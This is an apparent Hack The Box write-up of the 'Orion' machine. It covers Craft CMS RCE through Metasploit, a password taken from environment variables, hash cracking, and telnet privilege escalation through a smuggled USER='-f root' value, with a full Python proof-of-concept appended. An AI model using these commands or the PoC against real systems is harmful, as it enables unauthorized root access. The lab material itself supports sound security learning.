@@ -1,0 +1,203 @@
+<div class="writeup-content">
+    <div style="text-align: center;">
+        <h1>Hack The Box</h1>
+        <h2>Orion</h2>
+        <img src="/pngs/HTB/Easy/Orion/Orion.png" alt="Orion Banner" style="border:none; width: 300px; margin-bottom: 20px;">
+        <h3 style="color: #3fb950;">Level: Easy</h3>
+    </div>
+
+    <p>Summary of the attack path:</p>
+    <ul>
+        <li><strong>Craft CMS 5.6.16</strong> &mdash; pre-auth RCE via <strong>CVE-2025-32432</strong>.</li>
+        <li>Recovered database credentials, dumped a user hash and cracked it with <strong>hashcat</strong>.</li>
+        <li>Local privilege escalation through a vulnerable <strong>Telnet (GNU inetutils) 2.7</strong> service &mdash; <strong>CVE-2026-24061</strong>.</li>
+    </ul>
+
+    <h3 class="step-header">1. Enumeration</h3>
+    <p>We start with port enumeration:</p>
+    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.64.239</div>
+    <ul>
+        <li><strong>-p- --open</strong>: Scans all ports and shows only the open ones.</li>
+        <li><strong>-sS</strong>: SYN stealth scan.</li>
+        <li><strong>-Pn</strong>: Skips host discovery (treats the host as up).</li>
+        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+    </ul>
+
+    <p>Ports <code>22</code> (SSH) and <code>80</code> (HTTP) are open. We add the domain <code>orion.htb</code> to our <code>/etc/hosts</code> and fuzz for directories with <code>ffuf</code>:</p>
+    <div class="terminal-box">ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://orion.htb/FUZZ</div>
+    <p>This reveals an <code>admin</code> directory. The site runs <code>Craft CMS 5.6.16</code>.</p>
+
+    <img src="/pngs/HTB/Easy/Orion/craftcms-version.png" alt="Craft CMS 5.6.16 version shown on the admin login page" loading="lazy">
+
+    <h3 class="step-header">2. Foothold</h3>
+    <p>Craft CMS 5.6.16 is vulnerable to <strong>CVE-2025-32432</strong>, a pre-auth remote code execution bug. We use the Metasploit module for it:</p>
+    <div class="terminal-box">msfconsole -q
+msf &gt; search Craftcms
+msf &gt; use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) &gt; options
+...</div>
+    <p>This gives us a Meterpreter session. We drop to a shell and upgrade it:</p>
+    <div class="terminal-box">meterpreter &gt; shell
+
+python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</div>
+
+    <p>In <code>/etc/passwd</code> we find two interesting users: <code>root</code> and <code>adam</code>.</p>
+    <p>By reading the environment variables with the <code>env</code> command, we find a password:</p>
+    <div class="terminal-box">SuperSecureCraft123Pass!</div>
+
+    <p>These credentials log us in to the database:</p>
+    <div class="terminal-box">mysql -u root -p
+Enter password: SuperSecureCraft123Pass!</div>
+
+    <img src="/pngs/HTB/Easy/Orion/mysql-login.png" alt="Logging in to MariaDB as root using the recovered password" loading="lazy">
+
+    <p>We browse the <code>orion</code> database and read the users table:</p>
+    <div class="terminal-box">MariaDB [(none)]&gt; show databases;
+MariaDB [(none)]&gt; use orion;
+MariaDB [orion]&gt; select * from users;</div>
+    <p>Here we find a password hash for the user <code>adam</code> (email <code>adam@orion.htb</code>):</p>
+    <div class="terminal-box">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</div>
+
+    <p>We crack it with hashcat (bcrypt, mode 3200):</p>
+    <div class="terminal-box">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</div>
+
+    <fieldset class="cred-box">
+        <legend>Credentials</legend>
+        <code>adam : darkangel</code>
+    </fieldset>
+
+    <p>These credentials give us SSH access as <code>adam</code>, where we find the user flag.</p>
+    <fieldset class="root-box">
+        <legend>User Flag</legend>
+        <code>[REDACTED]</code>
+    </fieldset>
+
+    <h3 class="step-header">3. Privilege Escalation</h3>
+    <p>After logging in as <code>adam</code>, we check the running services:</p>
+    <div class="terminal-box">ss -tulpn</div>
+
+    <img src="/pngs/HTB/Easy/Orion/ss-tulpn.png" alt="Output of ss -tulpn showing a service listening on 127.0.0.1:23" loading="lazy">
+
+    <p>A service is listening on port <code>23</code>, which is normally Telnet. We check the version:</p>
+    <div class="terminal-box">telnet -V
+telnet (GNU inetutils) 2.7</div>
+
+    <p>This version of Telnet is vulnerable to a local privilege escalation
+       (<a href="https://github.com/0p5cur/CVE-2026-24061-POC/tree/main">CVE-2026-24061</a>).
+       The quickest way to abuse it is a single command:</p>
+    <div class="terminal-box">USER=&quot;-f root&quot; telnet -a 127.0.0.1 23</div>
+
+    <ul>
+        <li><strong>USER="-f root"</strong>: The server passes the user-supplied <code>USER</code> environment variable straight into <code>/usr/bin/login</code> without checking it, so it runs <code>login -f root</code>. The <code>-f</code> flag skips the password check and logs the user in immediately.</li>
+        <li><strong>-a, --login</strong>: Attempt automatic login.</li>
+    </ul>
+    <p>So we tell the system to use the <code>root</code> user, skip the password check, and log in automatically &mdash; giving us a root shell.</p>
+
+    <fieldset class="root-box">
+        <legend>Root Flag</legend>
+        <code>[REDACTED]</code>
+    </fieldset>
+
+    <h3 class="step-header">Appendix: Full PoC</h3>
+    <p>The same bug can be exploited with a self-contained Python PoC:</p>
+    <div class="terminal-box">#!/usr/bin/env python
+# CVE-2026-24061 PoC (USER=&quot;-f root&quot; telnet -a 127.0.0.1 23)
+# By @opscur (https://github.com/0p5cur)
+
+
+import socket
+import sys
+import threading
+import argparse
+import os
+
+IAC  = 255
+DONT = 254
+DO   = 253
+WONT = 252
+WILL = 251
+SB   = 250
+SE   = 240
+
+def negotiate(sock, data):
+    clean_output = b&quot;&quot;
+    i = 0
+    while i &lt; len(data):
+        if data[i:i+1] == b&#x27;\xff&#x27;:
+            if i + 1 &gt;= len(data): break
+            cmd = ord(data[i+1:i+2]) if sys.version_info[0] &lt; 3 else data[i+1]
+            if cmd in [DO, DONT, WILL, WONT]:
+                if i + 2 &gt;= len(data): break
+                opt = ord(data[i+2:i+3]) if sys.version_info[0] &lt; 3 else data[i+2]
+                if cmd == DO and opt != 39:
+                    sock.sendall(bytes(bytearray([IAC, WONT, opt])))
+                elif cmd == WILL:
+                    sock.sendall(bytes(bytearray([IAC, DONT, opt])))
+                i += 3
+            elif cmd == SB:
+                j = i + 2
+                while j &lt; len(data):
+                    if data[j:j+1] == b&#x27;\xf0&#x27;: break
+                    j += 1
+                i = j + 1
+            else:
+                i += 2
+        else:
+            clean_output += data[i:i+1]
+            i += 1
+    return clean_output
+
+def reader(s):
+    while True:
+        try:
+            data = s.recv(4096)
+            if not data: os._exit(0)
+            text = negotiate(s, data)
+            if text:
+                if sys.version_info[0] &gt;= 3:
+                    sys.stdout.buffer.write(text)
+                else:
+                    sys.stdout.write(text)
+                sys.stdout.flush()
+        except: break
+
+def exploit(target, port):
+    print(&quot;[+] Connecting to &quot; + str(target) + &quot;:&quot; + str(port) + &quot;...&quot;)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target, port))
+        s.settimeout(None)
+        s.sendall(b&#x27;\xff\xfb\x27\xff\xfa\x27\x00\x00USER\x01-f root\xff\xf0&#x27;)
+        t = threading.Thread(target=reader, args=(s,))
+        t.daemon = True
+        t.start()
+
+        import time
+        time.sleep(1)
+
+        if not t.is_alive():
+            print(&quot;[-] The target does not seem vulnerable&quot;)
+            return
+
+        while True:
+            cmd = sys.stdin.readline()
+            if not cmd: break
+            s.sendall(cmd.encode() if sys.version_info[0] &gt;= 3 else cmd)
+
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        print(&quot;[-] The target seems to be unreachable&quot;)
+    except KeyboardInterrupt:
+        s.close()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;target&quot;)
+    parser.add_argument(&quot;port&quot;, type=int, default=23, nargs=&#x27;?&#x27;)
+    args = parser.parse_args()
+    print(&quot;[+] POC by @opscur (https://github.com/0p5cur)&quot;)
+    exploit(args.target, args.port)
+
+if __name__ == &quot;__main__&quot;:
+    main()</div>
+</div>
